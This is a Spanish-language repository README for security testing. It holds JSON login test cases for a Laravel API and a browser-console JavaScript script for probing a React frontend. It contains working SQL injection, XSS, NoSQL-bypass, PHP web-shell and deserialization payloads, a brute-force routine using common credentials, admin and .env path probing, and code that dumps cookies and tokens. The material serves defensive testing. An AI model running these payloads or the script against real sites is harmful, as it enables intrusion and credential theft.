<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400"></a></p>

<p align="center">
<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
</p>

## About Laravel Test Security API

// ========== CASOS VÁLIDOS ==========
### 1. Login correcto
{
"email": "user@example.com",
"password": "ValidPassword123!"
}

// ========== VALIDACIÓN DE CAMPOS REQUERIDOS ==========
### 2. Email faltante
{
"password": "ValidPassword123!"
}

### 3. Password faltante
{
"email": "user@example.com"
}

### 4. Ambos campos faltantes
{}

### 5. Campos vacíos
{
"email": "",
"password": ""
}

### 6. Campos null
{
"email": null,
"password": null
}

// ========== VALIDACIÓN DE FORMATO EMAIL ==========
### 7. Email sin @
{
"email": "userexample.com",
"password": "ValidPassword123!"
}

### 8. Email sin dominio
{
"email": "user@",
"password": "ValidPassword123!"
}

### 9. Email sin usuario
{
"email": "@example.com",
"password": "ValidPassword123!"
}

### 10. Email con espacios
{
"email": "user @example.com",
"password": "ValidPassword123!"
}

### 11. Email muy largo (más de 255 caracteres)
{
"email": "a".repeat(250) + "@example.com",
"password": "ValidPassword123!"
}

// ========== ATAQUES DE INYECCIÓN SQL ==========
### 12. SQL Injection en email
{
"email": "admin'; DROP TABLE users; --",
"password": "password"
}

### 13. SQL Injection en password
{
"email": "user@example.com",
"password": "' OR '1'='1"
}

### 14. SQL Injection Union
{
"email": "admin' UNION SELECT * FROM users WHERE '1'='1",
"password": "password"
}

// ========== ATAQUES XSS ==========
### 15. XSS en email
{
"email": "<script>alert('XSS')</script>",
"password": "password"
}

### 16. XSS en password
{
"email": "user@example.com",
"password": "<img src=x onerror=alert('XSS')>"
}

// ========== ATAQUES DE BYPASS ==========
### 17. Boolean bypass
{
"email": "admin@example.com",
"password": true
}

### 18. Array injection
{
"email": ["admin@example.com"],
"password": ["password"]
}

### 19. Object injection
{
"email": {"$ne": null},
"password": {"$ne": null}
}

// ========== VALIDACIÓN DE LONGITUD ==========
### 20. Password muy corto
{
"email": "user@example.com",
"password": "123"
}

### 21. Password muy largo (más de 255 caracteres)
{
"email": "user@example.com",
"password": "a".repeat(500)
}

// ========== CARACTERES ESPECIALES ==========
### 22. Caracteres Unicode
{
"email": "üser@éxample.com",
"password": "pássword123"
}

### 23. Caracteres de control
{
"email": "user@example.com\n\r",
"password": "password\0\x08"
}

// ========== ATAQUES DE ENUMERACIÓN ==========
### 24. Email inexistente
{
"email": "nonexistent@example.com",
"password": "password"
}

### 25. Email válido, password incorrecta
{
"email": "existing@example.com",
"password": "wrongpassword"
}

// ========== CASOS EDGE ==========
### 26. Tipos de datos incorrectos
{
"email": 123,
"password": 456
}

### 27. Campos adicionales
{
"email": "user@example.com",
"password": "ValidPassword123!",
"admin": true,
"role": "administrator"
}

### 28. JSON malformado (para probar parseo)
{
"email": "user@example.com",
"password": "ValidPassword123!",
"extra":
}

// ========== ATAQUES DE TIMING ==========
### 29. Múltiples intentos rápidos (Rate Limiting)
// Enviar este JSON múltiples veces en rápida sucesión
{
"email": "user@example.com",
"password": "wrongpassword"
}

// ========== ATAQUES DE FUERZA BRUTA ==========
### 30. Lista de contraseñas comunes
{
"email": "admin@example.com",
"password": "123456"
}

{
"email": "admin@example.com",
"password": "password"
}

{
"email": "admin@example.com",
"password": "admin"
}

// ========== HEADERS Y METADATA MALICIOSOS ==========
### 31. Con headers sospechosos (a nivel HTTP, no JSON)
{
"email": "user@example.com",
"password": "ValidPassword123!",
"user-agent": "<?php echo system($_GET['cmd']); ?>"
}

// ========== PRUEBAS DE ENCODING ==========
### 32. Base64 encoded
{
"email": "dXNlckBleGFtcGxlLmNvbQ==",  // user@example.com en base64
"password": "VmFsaWRQYXNzd29yZDEyMyE="   // ValidPassword123! en base64
}

// ========== CASOS DE LÍMITES ==========
### 33. Email en límite máximo permitido
{
"email": "a".repeat(64) + "@" + "b".repeat(63) + ".com",
"password": "ValidPassword123!"
}

// ========== ATAQUES DE DESERIALIZACIÓN ==========
### 34. Payload serializado malicioso
{
"email": "user@example.com",
"password": "O:8:\"stdClass\":1:{s:4:\"evil\";s:10:\"phpinfo();\"}"
}

## About React Test Security Frontend

// ===================================
// SCRIPT DE PRUEBAS DE SEGURIDAD WEB
// ===================================
// ⚠️ SOLO USAR EN SITIOS PROPIOS O CON AUTORIZACIÓN
// ⚠️ PARA FINES EDUCATIVOS Y TESTING ÉTICO

console.log('%c🔒 HERRAMIENTAS DE TESTING DE SEGURIDAD WEB', 'color: red; font-size: 18px; font-weight: bold;');
console.log('%c⚠️ ADVERTENCIA: Solo usar en sitios propios', 'color: orange; font-size: 14px;');

// ===================================
// 1. PRUEBAS XSS (Cross-Site Scripting)
// ===================================
const XSSTests = {
// Prueba XSS básica
testBasicXSS: function() {
console.log('🔍 Iniciando pruebas XSS básicas...');

        const xssPayloads = [
            '<script>alert("XSS Vulnerability Found!")</script>',
            '<img src="x" onerror="alert(\'XSS via img tag\')">',
            '<svg onload="alert(\'XSS via SVG\')">',
            'javascript:alert("XSS via href")',
            '"><script>alert("XSS via broken HTML")</script>',
            '<iframe src="javascript:alert(\'XSS via iframe\')"></iframe>',
            '<body onload="alert(\'XSS via body onload\')">',
            '<input onfocus="alert(\'XSS via input focus\')" autofocus>'
        ];

        // Buscar formularios en la página
        const forms = document.querySelectorAll('form');
        const inputs = document.querySelectorAll('input[type="text"], input[type="search"], textarea');

        console.log(`📋 Formularios encontrados: ${forms.length}`);
        console.log(`📝 Inputs de texto encontrados: ${inputs.length}`);

        // Función para probar XSS en inputs
        const testXSSInInputs = () => {
            inputs.forEach((input, index) => {
                xssPayloads.forEach((payload, payloadIndex) => {
                    setTimeout(() => {
                        input.value = payload;
                        input.dispatchEvent(new Event('input'));
                        input.dispatchEvent(new Event('change'));
                        console.log(`🧪 Payload ${payloadIndex + 1} aplicado en input ${index + 1}: ${payload.substring(0, 50)}...`);
                    }, (index * xssPayloads.length + payloadIndex) * 100);
                });
            });
        };

        testXSSInInputs();
    },

    // Prueba XSS en URL parameters
    testURLXSS: function() {
        console.log('🔗 Probando XSS en parámetros URL...');
        
        const urlPayloads = [
            '?search=<script>alert("XSS in URL")</script>',
            '?q="><img src=x onerror=alert("XSS")>',
            '?name=<svg onload=alert("XSS")>',
            '?data=javascript:alert("XSS")'
        ];

        urlPayloads.forEach((payload, index) => {
            console.log(`🔗 Payload URL ${index + 1}: ${window.location.origin + payload}`);
        });
    }
};

// ===================================
// 2. PRUEBAS DE FUERZA BRUTA
// ===================================
const BruteForceTests = {
// Fuerza bruta en formularios de login
testLoginBruteForce: async function() {
console.log('🔨 Iniciando pruebas de fuerza bruta en login...');

        const commonPasswords = [
            'admin', '123456', 'password', '12345678', 'qwerty',
            'abc123', 'password123', 'admin123', '123123', 'welcome',
            'login', 'pass', '1234', 'test', 'guest', 'root',
            'administrator', 'user', 'demo', 'sample'
        ];

        const commonUsernames = [
            'admin', 'administrator', 'user', 'test', 'demo',
            'guest', 'root', 'sa', 'operator', 'manager'
        ];

        // Buscar formularios de login
        const loginForms = document.querySelectorAll('form');
        const usernameInputs = document.querySelectorAll(
            'input[type="text"][name*="user"], input[type="text"][name*="login"], input[type="email"]'
        );
        const passwordInputs = document.querySelectorAll('input[type="password"]');

        console.log(`🔍 Formularios detectados: ${loginForms.length}`);
        console.log(`👤 Campos de usuario: ${usernameInputs.length}`);
        console.log(`🔒 Campos de contraseña: ${passwordInputs.length}`);

        if (usernameInputs.length > 0 && passwordInputs.length > 0) {
            let attempts = 0;
            const maxAttempts = 20; // Limitar intentos para no sobrecargar

            for (let i = 0; i < commonUsernames.length && attempts < maxAttempts; i++) {
                for (let j = 0; j < commonPasswords.length && attempts < maxAttempts; j++) {
                    setTimeout(() => {
                        usernameInputs[0].value = commonUsernames[i];
                        passwordInputs[0].value = commonPasswords[j];
                        
                        console.log(`🔓 Intento ${attempts + 1}: ${commonUsernames[i]}:${commonPasswords[j]}`);
                        
                        // Simular envío (sin ejecutar realmente)
                        // loginForms[0].submit(); // Descomentado para testing real
                        
                        attempts++;
                    }, attempts * 1000); // 1 segundo entre intentos
                }
            }
        } else {
            console.log('❌ No se encontraron formularios de login válidos');
        }
    },

    // Fuerza bruta en rutas comunes
    testDirectoryBruteForce: function() {
        console.log('📁 Iniciando pruebas de fuerza bruta en directorios...');
        
        const commonPaths = [
            '/admin', '/administrator', '/wp-admin', '/login',
            '/dashboard', '/panel', '/control', '/manage',
            '/api', '/backup', '/config', '/database',
            '/phpmyadmin', '/cpanel', '/webmail', '/ftp',
            '/ssh', '/shell', '/cmd', '/test', '/dev',
            '/.env', '/robots.txt', '/sitemap.xml'
        ];

        const baseURL = window.location.origin;

        commonPaths.forEach((path, index) => {
            setTimeout(() => {
                fetch(baseURL + path)
                    .then(response => {
                        if (response.status === 200) {
                            console.log(`✅ Ruta encontrada: ${baseURL + path} (Status: ${response.status})`);
                        } else if (response.status === 403) {
                            console.log(`🔒 Ruta protegida: ${baseURL + path} (Status: ${response.status})`);
                        } else {
                            console.log(`❌ Ruta no encontrada: ${baseURL + path} (Status: ${response.status})`);
                        }
                    })
                    .catch(error => {
                        console.log(`⚠️ Error probando: ${baseURL + path} - ${error.message}`);
                    });
            }, index * 200); // 200ms entre requests
        });
    }
};

// ===================================
// 3. PRUEBAS DE SQL INJECTION
// ===================================
const SQLInjectionTests = {
testSQLInjection: function() {
console.log('💉 Iniciando pruebas de SQL Injection...');

        const sqlPayloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
            "' OR 'a'='a",
            "1' OR '1'='1' #",
            "' OR 1=1 LIMIT 1--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ];

        // Buscar todos los inputs
        const inputs = document.querySelectorAll('input[type="text"], input[type="search"], textarea');
        
        console.log(`📝 Testing SQL Injection en ${inputs.length} campos de entrada`);

        inputs.forEach((input, inputIndex) => {
            sqlPayloads.forEach((payload, payloadIndex) => {
                setTimeout(() => {
                    input.value = payload;
                    input.dispatchEvent(new Event('input'));
                    input.dispatchEvent(new Event('change'));
                    console.log(`💉 SQL Payload ${payloadIndex + 1} en input ${inputIndex + 1}: ${payload}`);
                }, (inputIndex * sqlPayloads.length + payloadIndex) * 150);
            });
        });
    }
};

// ===================================
// 4. PRUEBAS DE INFORMACIÓN SENSIBLE
// ===================================
const InfoGatheringTests = {
checkSensitiveInfo: function() {
console.log('🔍 Buscando información sensible...');

        // Verificar headers de seguridad
        console.log('🔒 Headers de seguridad:');
        fetch(window.location.href)
            .then(response => {
                const securityHeaders = [
                    'X-Frame-Options',
                    'X-XSS-Protection',
                    'X-Content-Type-Options',
                    'Strict-Transport-Security',
                    'Content-Security-Policy'
                ];
                
                securityHeaders.forEach(header => {
                    const value = response.headers.get(header);
                    if (value) {
                        console.log(`✅ ${header}: ${value}`);
                    } else {
                        console.log(`❌ ${header}: No configurado`);
                    }
                });
            });

        // Buscar información en el DOM
        const sensitiveSelectors = [
            'input[type="hidden"]',
            '[data-api-key]',
            '[data-token]',
            'script[src*="api"]',
            'meta[name="csrf-token"]'
        ];

        sensitiveSelectors.forEach(selector => {
            const elements = document.querySelectorAll(selector);
            if (elements.length > 0) {
                console.log(`🔍 ${selector}: ${elements.length} elementos encontrados`);
                elements.forEach(el => console.log(el));
            }
        });

        // Verificar cookies
        if (document.cookie) {
            console.log('🍪 Cookies encontradas:');
            document.cookie.split(';').forEach(cookie => {
                console.log(`   ${cookie.trim()}`);
            });
        }

        // Verificar localStorage y sessionStorage
        console.log('💾 Storage del navegador:');
        console.log('   localStorage items:', localStorage.length);
        console.log('   sessionStorage items:', sessionStorage.length);
    }
};

// ===================================
// 5. FUNCIONES DE UTILIDAD
// ===================================
const SecurityUtils = {
runAllTests: function() {
console.log('🚀 Ejecutando todas las pruebas de seguridad...');
console.log('⏱️ Esto puede tomar varios minutos...');

        XSSTests.testBasicXSS();
        setTimeout(() => XSSTests.testURLXSS(), 2000);
        setTimeout(() => BruteForceTests.testLoginBruteForce(), 4000);
        setTimeout(() => BruteForceTests.testDirectoryBruteForce(), 6000);
        setTimeout(() => SQLInjectionTests.testSQLInjection(), 8000);
        setTimeout(() => InfoGatheringTests.checkSensitiveInfo(), 10000);
        
        setTimeout(() => {
            console.log('✅ Todas las pruebas completadas');
            console.log('📊 Revisa los resultados en la consola');
        }, 15000);
    },

    generateReport: function() {
        console.log('📊 REPORTE DE SEGURIDAD');
        console.log('========================');
        console.log(`🌐 Sitio analizado: ${window.location.href}`);
        console.log(`📅 Fecha: ${new Date().toLocaleString()}`);
        console.log(`🔗 Protocol: ${window.location.protocol}`);
        console.log(`🏠 Domain: ${window.location.hostname}`);
        console.log('========================');
    }
};

// ===================================
// EXPOSER FUNCIONES GLOBALMENTE
// ===================================
window.SecurityTesting = {
XSS: XSSTests,
BruteForce: BruteForceTests,
SQLInjection: SQLInjectionTests,
InfoGathering: InfoGatheringTests,
Utils: SecurityUtils
};

// ===================================
// INSTRUCCIONES DE USO
// ===================================
console.log('%c📖 INSTRUCCIONES DE USO:', 'color: blue; font-size: 16px; font-weight: bold;');
console.log('');
console.log('🔸 Ejecutar todas las pruebas:');
console.log('   SecurityTesting.Utils.runAllTests()');
console.log('');
console.log('🔸 Pruebas específicas:');
console.log('   SecurityTesting.XSS.testBasicXSS()');
console.log('   SecurityTesting.BruteForce.testLoginBruteForce()');
console.log('   SecurityTesting.SQLInjection.testSQLInjection()');
console.log('   SecurityTesting.InfoGathering.checkSensitiveInfo()');
console.log('');
console.log('🔸 Generar reporte:');
console.log('   SecurityTesting.Utils.generateReport()');
console.log('');
console.log('%c⚠️ RECUERDA: Solo usar en sitios propios', 'color: red; font-weight: bold;');
